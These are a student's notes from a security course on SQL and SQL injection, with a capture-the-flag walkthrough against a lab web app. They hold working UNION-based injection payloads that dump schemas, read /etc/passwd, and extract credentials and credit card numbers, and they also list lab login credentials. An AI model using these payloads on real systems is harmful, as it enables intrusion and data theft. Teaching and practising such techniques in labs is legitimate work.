## CCTC Security Day 3
- agenda


## Admin Data 
| Field | Value | 
|-|-|
| Stack # | 10 | 
| Username | JAMO-005-B | 
| Password | YdY8vrRGOsRfhy6 |
| lin.internet | 10.50.36.131 |
10.50.30.77
### CTFd info
| Field | Value | 
|-|-|
| Flag | 5QL1nj3ct5t@rt0F@ct1v1ty | 
| jump box | 10.100.28.48 | 
## Day 2: Web Exploitation Continued - SQL Injection (database)

***SQL (Structured Query Language) is a standardized programming language that's used to manage relational databases and perform various operations on the data in them.***

### Standard Commands
| Name | Description | 
|-|-|
| USE | select the DB you would like to use. | 
| SELECT | extracts data from a database | 
| UPDATE | updates data in a database | 
| DELETE | deletes data in a database | 
| INSERT INTO | Inserts new data into a database | 
| CREATE DATABASE | creates a new database|
| ALTER DATA BASE | modifies a database |
| CREATE TABLE | creates a new table | 
| ALTER TABLE | creates a new table | 
| DROP TABLE | deletes a table | 
| CREATE INDEX | creates an index (search key)|
| DROP INDEX | deletes an index | 
| UNION | Used to combine the result-set of two or more SELECT statements, be sure ***COLUMNS*** amount matches | 
| [website](https://www.w3schools.com/SQl/sql_syntax.asp) 

### Breakdown of a database

**db contains -> tables, which contain -> rows of data, and columns with indexes that contain the attributes of the data in that column** 

### Examples from instructor

- `select * from session.car;`, pull data from the session data base, car table 
- `use session` , puts you into a specific database, think about it like "cd" 
- `select from * Tires;` pulls all columbs from tires tables 
- `select size,cost from Tires;` pulls size and cost column from Tires 
- `select * from car UNION select *,5,6 from Tires;` Unions car and tires tables and adjusts for tires not having the same amount of columns as car 
- 

### [SQLBOLT Exercises](https://sqlbolt.com/lesson/filtering_sorting_query_results)

- Find the movie with a row id of 6 -> `SELECT id, title FROM movies WHERE id = 6;`
- Find the movies released in the years between 2000 and 2010 -> `SELECT title, year FROM movies WHERE year BETWEEN 2000 AND 2010;`
- Find the movies not released in the years between 2000 and 2010 -> `SELECT title, year FROM movies WHERE year NOT BETWEEN 2000 AND 2010;`
- Find the first 5 Pixar movies and their release year -> `SELECT * FROM movies WHERE year BETWEEN 1995 AND 2003;`
- Find all the Toy Story movies -> `SELECT * FROM movies WHERE Title LIKE "Toy Story%";`
- Find all the movies directed by John Lasseter -> `SELECT * FROM movies WHERE Director='John Lasseter';`
- Find all the movies (and director) not directed by John Lasseter -> `SELECT * FROM movies WHERE Director!='John Lasseter';`
- Find all the WALL-* movies -> `SELECT * FROM movies WHERE Title LIKE "WALL-%";`
- List all directors of Pixar movies (alphabetically), without duplicates  -> `SELECT DISTINCT director FROM movies ORDER BY director ASC;`
- List the last four Pixar movies released (ordered from most recent to least) -> `SELECT title, year FROM movies ORDER BY year DESC LIMIT 4;`
- List the first five Pixar movies sorted alphabetically  -> `SELECT * FROM movies Order by title asc LIMIT 5;`
- List the next five Pixar movies sorted alphabetically -> `SELECT * FROM movies Order by title asc LIMIT 5 offset 5;`

***
***
### SQL Injection - Considerations

    Require Valid SQL Queries
    Fully patched systems can be vulnerable due to misconfiguration
    Input Field Sanitization
    String vs Integer Values
    Is information_schema Database available?
    GET Request versus POST Request HTTP methods

### Unsanitized VS Sanitized Field 

    **Unsanitized:** input fields can be found using a Single Quote '
    - Will return extraneous information

    - ' closes a variable to allow for additional statements/clauses

    - May show no errors or generic error (harder Injection)

    **Sanitized:** input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)

    **Validation:** checks inputs to ensure it meets a criteria (String doesn’t contain ')

### Server-Side Query Processing
User enters JohnDoe243 in the name field and his password in the pass field.

Server-side Query passed would be: 

Before Input:
`SELECT id FROM users WHERE name='$name' AND pass='$pass';`

After Input:
`SELECT id FROM users WHERE name='JohnDoe243' AND pass='paas1234';`




## SCHEMA
Table_shema = Database names
Table_name = names of tables inside of databases
column_name = names of colums inside of tables 

information_schema.columns 

command we did in class to dump entire database -> `Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns#` 

To see manufacturer info -> `Audi' UNION SELECT id,2,name,4,pass from session.user#`

To see user version -> `Audi' UNION SELECT @@version,1,2,3,4 from session.user#`

to see pwd -> `Audi' UNION SELECT load_file("/etc/passwd"),2,3,4,5 from session.user#`

To see database from this website (restricts search, may be helpful or not) -> `Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns where table_schema=database()#`

****
***
## Flags

see whole db --> `http://10.100.28.48/cases/productsCategory.php?category=1%20UNION%20SELECT%20table_schema,table_name,column_name%20from%20information_schema.columns%20#`
1. DNLA Category

        On the DNLA site identify the flag using the Categories page. To answer input the characters inside the flag.

        - 10.100.28.48/cases/productsCategory.php?category=1 or 1=1
        - scroll down --> kXV98Ss9HxfDagq0omnE

2. Tables

        How many tables are able to be identified through Injection of the web database? 
        - 8

3. Admin creds

        On the DNLA site identify the flag using the Categories page. To answer input the characters inside the flag.
        - http://10.100.28.48/cases/productsCategory.php?category=1%20UNION%20SELECT%20username,password,3%20from%20sqlinjection.members#
        - Boss, looq5vCaNhHqtBkOEy5r


4. Products

        Utilizing the search page on DNLA, identify the flag. To answer input only the characters inside the flag
        - ram' or 1='1
        - kXV98Ss9HxfDagq0omnE

5. SQL Version

        Identify the version of the database that DNLA is utilizing
        - =ram' UNION SELECT @@version,3#
        -10.1.48-MariaDB-0ubuntu0.18.04.1

6. Credit Card

        Utilizing the input field on DNLA budget page, find the flag associated with credit cards. To answer the question enter only the characters inside the flag.
        - http://10.100.28.48/cases/productsCategory.php?category=1%20UNION%20SELECT%20creditcard_number,2,3%20from%20sqlinjection.payments#
        - atQ7GR3Crwrr7R8rPLuJ
7. ID Search

        Find the flag associated with id 1337.
        - http://10.100.28.48/cases/productsCategory.php?category=1%20UNION%20SELECT%20data,mime,id%20from%20sqlinjection.share4#
        - decode from base664 -> etc5J7ckkFCX88oI4ypw 
8. Create an admin user 
        Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.
